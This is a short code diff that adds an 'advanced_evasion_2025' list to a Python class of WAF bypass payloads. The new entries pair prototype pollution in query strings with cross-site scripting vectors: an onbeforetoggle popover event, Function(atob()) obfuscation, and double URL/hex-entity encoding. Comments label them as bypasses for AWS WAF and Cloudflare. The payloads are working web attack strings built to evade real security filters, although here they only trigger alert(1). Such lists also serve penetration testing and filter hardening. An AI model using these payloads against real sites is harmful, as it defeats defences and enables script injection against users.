@@ -472,6 +472,14 @@ class WAFBypassPayloads:
                 f'{{"constructor": {{"prototype": {{"{base_prop}": true}}}}}}',
                 f'{{"a": {{"__proto__": {{"{base_prop}": true}}}}}}',
             ],
+            "advanced_evasion_2025": [
+                # AWS WAF Bypass (Rare DOM Event)
+                f"?__proto__[{base_prop}]=<button popover=\"auto\" onbeforetoggle=alert(1)>",
+                # Cloudflare Bypass (Function/atob obfuscation)
+                f"?__proto__[{base_prop}]=<script>Function(atob('YWxlcnQoMSk='))()</script>",
+                # Encoding Bertingkat (Dual URL/Hex Entity) -> %26%230x3C%3B = &#0x3C; = <
+                f"?__proto__[{base_prop}]=%26%230x3C%3Bsvg%20onload%3Dalert(1)%26%230x3E%3B",
+            ],
         }
 
 
